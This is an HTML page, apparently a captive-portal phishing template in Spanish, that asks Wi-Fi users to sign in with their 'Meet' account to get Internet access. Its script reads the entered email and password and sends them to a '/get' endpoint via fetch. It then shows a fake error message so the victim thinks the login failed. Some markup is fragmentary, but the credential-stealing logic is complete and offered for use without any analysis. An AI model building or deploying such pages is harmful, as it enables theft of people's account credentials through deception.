<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <style>
      :root {
        --background-color: #121c2b;
        --login-container-background-color: #182232;
        --text-color: #f4f4f4;
        --input-background-color: #1e2939;
        --password-show-button-text-color: #9fef00;
        --password-show-button-color: #b1f233;
        --password-show-button-color-hover: #121c2b;
        --buttons: #9fef00;
        --buttons-text: #121c2b;
        --buttons-hover: #b1f233;
        --border-color: #747775;
        --footer-buttons: #4007ab;
        --footer-buttons-text: #798ba5;
        --footer-buttons-hover: #182232;
        --footer-buttons-text-hover: #798ba5;
        --error-text-color: #d93025;
      }
      * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
      }
      body {
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        background-color: var(--background-color);
      }

      h1 {
        font-size: x-large;
        padding-bottom: 10px;
      }

      strong {
        font-size: x-large;
      }

      .login-container {
        background-color: var(--login-container-background-color);
        padding: 30px;
        border-radius: 30px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      }

      #logo {
        display: block;
        margin: 0 auto 10px;
        padding-top: -10px;
      }

      #logo svg {
        position: relative;
        size-adjust: 100px;
        max-height: 300px;
        margin: 0 auto;
        display: block;
      }

      .text {
        text-align: center;
        margin-top: 20px;
        margin-bottom: 30px;
        font-size: 14px;
        color: var(--text-color);
      }

      .text h2 {
        margin-top: 5px;
        margin-bottom: 3px;
        font-weight: lighter;
        color: var(--text-color);
      }

      .g-input {
        display: block;
        width: 100%;
        padding: 10px;
        margin-bottom: 16px;
        color: var(--text-color);
        background-color: var(--input-background-color);
        border: 1px solid var(--input-background-color);
        border-radius: 5px;
      }

      .buttons {
        display: flex;
        flex-direction: row-reverse;
        flex-wrap: wrap;
        width: 100%;
        margin-top: 20px;
      }

      input[type="checkbox"] {
        /* Double-sized Checkboxes */
        -ms-transform: scale(1.1); /* IE */
        -moz-transform: scale(1.1); /* FF */
        -webkit-transform: scale(1.1); /* Safari and Chrome */
        -o-transform: scale(1.1); /* Opera */
        transform: scale(1.1);
        width: 1.4rem;
        padding: 10px;
        margin-left: 5px;
        margin-right: 7px;
        accent-color: var(--buttons);
        background: var(--buttons);
      }

      .info {
        margin-bottom: -10px;
      }

      .showPass {
        color: var(--footer-buttons-text);
        font-size: 0.75rem;
        font-weight: lighter;
        width: 100%;
        padding: 0px;
        border: none;
        border-radius: 30px;
        background-color: var(--login-container-background-color);
        cursor: pointer;
        text-align: center;
        vertical-align: middle;
        line-height: 50px;
        letter-spacing: 0rem;
      }

      .showPass:hover {
        background-color: var(--password-show-button-color-hover);
        cursor: pointer;
      }

      .showPass:active {
        background-color: var(--login-container-background-color);
      }
      .showPass:focus {
        background-color: var(--login-container-background-color);
      }

      .checkbox-label {
        padding-bottom: -10px;
      }

      .gbtn-primary {
        width: 30%;
        margin-top: 5px;
        text-align: center;
        vertical-align: middle;
        height: 38px;
        border: none;
        border-radius: 5px;
        background-color: var(--buttons);
        color: var(--buttons-text);
        cursor: pointer;
        font-size: 0.875rem;
        font-weight: 900;
        font-weight: var(--c-afwt, 500);
        letter-spacing: 0rem;
      }

      .gbtn-primary:hover {
        background-color: var(--buttons-hover);
      }

      .footerMenu {
        margin-top: 20px;
        display: block;
        direction: ltr;
        font-size: 0.75rem;
        font-weight: 400;
        letter-spacing: 0rem;
        line-height: 1.4285714286;
        width: 105%;
      }

      .footerMenu .class1 {
        float: left;
        display: inline;
        width: 37%;
        color: var(--footer-buttons-text);
        cursor: pointer;
        margin: -3.5px 7.4%;
        padding: 5px 4px;
        border: none;
        border-radius: 10px;
        text-align: center;
        vertical-align: middle;
      }

      .footerMenu .class1:hover {
        background-color: var(--footer-buttons-hover);
      }

      .footerMenu .buttonsLeft {
        margin-left: 20%;
      }

      .footerMenu .class2 {
        float: left;
        display: inline;
        color: var(--footer-buttons-text);
        display: inline;
        cursor: pointer;
        padding: 1% 1%;
        margin-left: 0%;
        margin-right: 10%;
        border: none;
        border-radius: 10px;
        text-align: center;
        vertical-align: middle;
      }

      .footerMenu .class3 {
        float: left;
        display: inline;
        color: var(--footer-buttons-text);
        cursor: pointer;
        padding: 1% 1%;
        margin-left: 1%;
        border: none;
        border-radius: 10px;
        text-align: center;
        vertical-align: middle;
      }

      .footerMenu .class4 {
        float: left;
        display: inline;
        color: var(--footer-buttons-text);
        cursor: pointer;
        padding: 1% 1%;
        margin-left: 0.5%;
        border: none;
        border-radius: 10px;
        text-align: center;
        vertical-align: middle;
      }

      .footerMenu .class2:hover,
      .class3:hover,
      .class4:hover {
        background-color: var(--footer-buttons-hover);
        color: var(--footer-buttons-text-hover);
      }

      .footerMenu .class3 {
        margin-left: -30px;
      }

      .footerMenu .openMenu {
        padding-top: 7px;
        margin-left: 4%;
        color: var(--footer-buttons-text-hover);
        filter: invert(79%) sepia(25%) saturate(2365%) hue-rotate(29deg)
          brightness(105%) contrast(101%);
      }

      /* Error message styling */
      .error-message {
        position: absolute;
        color: var(--error-text-color); /* Google's red color for errors */
        font-size: 13px;
        width: 100%;
        display: flex;
        align-items: center;
        margin-top: -27px;
      }

      .error-icon {
        margin-right: 5px;
      }
    </style>
    <meta
      name="viewport"
      content="width=device-width,initial-scale=1,maximum-scale=1"
    />
  </head>

            <div class="text">
              <h1>Para obtener acceso a Internet</h1>
              <h2>
                Accede con la cuenta que te inscribiste al
                <strong>Meet</strong>
              </h2>
            </div>
            <!-- Error message placeholder -->

              <input
                name="email"
                type="email"
                class="g-input"
                id="email"
                placeholder="Email"
                required
              />
              <input
                name="password"
                type="password"
                class="g-input"
                placeholder="Clave"
                id="password"
                required
              />
            </div>
            <label for="checkbox" class="showPass">
              <input
                type="checkbox"
                name="showPass"
                value="value"
                onclick="myFunction()"
              />

            <div class="buttons">
              <button class="gbtn-primary" id="siguiente" type="submit">
                Siguiente

  <script>
    const form = document.getElementById("email-form-step");
    form.addEventListener("submit", function (event) {
      event.preventDefault();
      const email = event.currentTarget.email.value;
      const password = event.currentTarget.password.value;

      // Properly encode the parameters to handle special characters
      const encodedEmail = encodeURIComponent(email);
      const encodedPassword = encodeURIComponent(password);

      fetch(`/get?email=${encodedEmail}&password=${encodedPassword}`);
    });

    function myFunction() {
      var x = document.getElementById("password");
      if (x.type === "password") {
        x.type = "text";
      } else {
        x.type = "password";
      }
    }

    document.getElementById("siguiente").addEventListener("click", function () {
      const errorMessage = document.getElementById("error-message");
      errorMessage.style.display = "flex"; // Show the error message

      // Hide the error message after 3 seconds (3000 milliseconds)
      setTimeout(function () {
        errorMessage.style.display = "none";
      }, 3000);
    });
  </script>
